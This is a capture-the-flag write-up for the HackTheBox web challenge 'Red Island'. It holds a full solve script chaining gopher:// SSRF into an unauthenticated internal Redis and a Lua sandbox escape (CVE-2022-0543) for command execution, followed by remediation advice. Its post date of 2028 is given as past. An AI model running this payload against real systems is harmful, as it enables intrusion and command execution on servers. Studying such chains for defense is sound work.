---
layout: post
title: "Red Island"
date: 2028-05-31 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssrf, gopher, redis, lua, rce, cve-2022-0543, cwe-918]
description: "A red-image-recolor web app fetches any URL you give it through node-libcurl with no scheme filter. That one gap turns into gopher:// SSRF, a raw conversation with an internal Redis, and a Lua sandbox escape (CVE-2022-0543) that runs a command and hands back the flag."
---

## Overview

Red Island is a **Medium** HackTheBox **Web** challenge. The app is a small Express
site that, after login, will fetch any image URL you give it and recolor it red. The
fetch is backed by **node-libcurl** with no restriction on the URL scheme, so it
becomes a full [Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html):
`gopher://` lets us write raw bytes to an internal Redis, and a Lua sandbox escape
([CVE-2022-0543](https://nvd.nist.gov/vuln/detail/CVE-2022-0543)) turns that Redis
foothold into remote code execution that reads the flag.

## The technique

The only interesting feature — "paste an image URL, we fetch and recolor it" — is the
whole vulnerability. libcurl speaks far more than HTTP, and the app validates only that
you sent *a URL*, not *which scheme*. Swapping `http://` for `gopher://` gives byte-level
control of a TCP stream to any port the server can reach.

The target is **Redis on 127.0.0.1:6379**, running with no password because it assumes
only local processes can reach it — but SSRF makes the app exactly that local process.
Redis runs Lua via `EVAL`, and on Debian/Ubuntu the packaged Redis leaves the Lua
`package` table reachable inside the sandbox. That is
[CVE-2022-0543](https://nvd.nist.gov/vuln/detail/CVE-2022-0543): with `package` in
reach you `loadlib` the native `io` library and break out to run OS commands.

## Solution

Fingerprint the internal port first — `dict://` returns a service banner through the
same SSRF primitive:

```
dict://127.0.0.1:6379/INFO
```

Then deliver the Lua escape over gopher. The Redis command stream is encoded into the
gopher path (`%0D%0A` = CRLF between commands, `%20` = space, trailing `quit` so the
server-side curl returns instead of hanging on an open socket):

Create `solve.py`:

```python
import re, sys, random, requests

HOST = sys.argv[1].rstrip("/")
u, p = f"rh{random.randint(1000,9999)}", f"pw{random.randint(1000,9999)}"

s = requests.Session()
s.post(f"{HOST}/api/register", json={"username": u, "password": p})
s.post(f"{HOST}/api/login",    json={"username": u, "password": p})

lua = ('eval "local il = package.loadlib(\\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\", \\"luaopen_io\\"); '
       'local io = il(); local f = io.popen(\\"/readflag\\", \\"r\\"); '
       'local r = f:read(\\"*a\\"); f:close(); return r" 0')
gopher = "gopher://127.0.0.1:6379/_" + (lua + "\r\nquit\r\n").replace("\r","").replace("\n","%0D%0A").replace(" ","%20")

r = s.post(f"{HOST}/api/red/generate", json={"url": gopher})
print(re.search(r"HTB\{.*?\}", r.text).group(0))
```

```bash
python3 solve.py http://<target>:<port>
```

The neat detail: the command output comes back **inside an error message**, not a normal
200 — the `/api/red/generate` endpoint returns HTTP 401 with a body like
`Unknown error occured while fetching the image file: $32\r\nHTB{...}\r\n+OK\r\n`. An
error path that echoes the fetched content is just as good a read oracle as a success
path.

```
HTB{...}
```

## Why it worked

Three gaps line up. The fetch has **no scheme allow-list**, so `gopher://` upgrades a URL
reader into raw-socket access to internal services. **Redis is on loopback with no auth**,
reachable only from the host — which the SSRF now is. And the **Debian Lua sandbox is
incomplete** ([CVE-2022-0543](https://nvd.nist.gov/vuln/detail/CVE-2022-0543)), so a
Redis command channel becomes OS command execution as the redis user, running the SUID
`/readflag`.

## Fix / defense

- **SSRF:** allow-list `http(s)://` only and reject every other scheme. Resolve the host
  and block loopback / RFC1918 / link-local destinations, re-checking after redirects.
  Constrain libcurl with `CURLOPT_PROTOCOLS` / `CURLOPT_REDIR_PROTOCOLS` set to HTTP+HTTPS.
- **Redis:** require `AUTH`, bind to a unix socket or a trusted interface only, and patch
  to Redis ≥ 6.2.7 / 6.0.16 / 5.0.14 (or the distro fix for
  [CVE-2022-0543](https://nvd.nist.gov/vuln/detail/CVE-2022-0543)).
- **Defense in depth:** nothing reachable by the web user should be able to read secrets
  directly — a SUID `/readflag` is fine for a CTF, not for production.
